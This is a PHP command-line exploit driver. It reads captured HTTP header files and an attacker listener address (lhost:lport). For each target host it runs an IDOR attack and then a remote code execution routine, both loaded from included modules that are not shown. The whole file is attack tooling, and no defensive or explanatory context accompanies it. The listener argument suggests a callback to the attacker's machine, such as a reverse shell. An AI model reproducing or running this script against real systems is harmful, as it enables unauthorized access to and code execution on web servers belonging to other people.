<?php
// included files
include("included/xml.php");
include("included/idor.php");
include("included/get_headers.php");
include("included/RemoteCodeExecution.php");
echo("\033[31m".file_get_contents("banner.txt")."\n\n\n\n");
if(sizeof($argv)<3){
echo "usage : php exploit.php headersfile1,headerfile2 lhost:lport\n";
exit;
}
$httpfiles=explode(",",$argv[1]);
$master=explode(":",$argv[2]);
//system("clear");
#
#   Setup payloads
#
###
echo "initialize http flags ...\n";
foreach($httpfiles as $httpfile){
$http_init=new Http();
$http_init->init(file_get_contents($httpfile));
$idor=new Idor();
$http_init->getcookies();
$http_init->generate();
echo $http_init->payload;
$idor=new Idor();
$idor->init($http_init->payload,$http_init->body['Host'],$master);
$idor->attack();
}
$default=new RemoteCodeExecution();
foreach($httpfiles as $httpfile){
$http_init->init(file_get_contents($httpfile));
$idor=new Idor();
$http_init->getcookies();
$http_init->generate();
//echo $http_init->payload;
echo "target >".$http_init->body['Host'];
$default->init(str_replace(" ","",$http_init->body['Host']),$http_init->payload,$master);
$default->exploit();}
?>
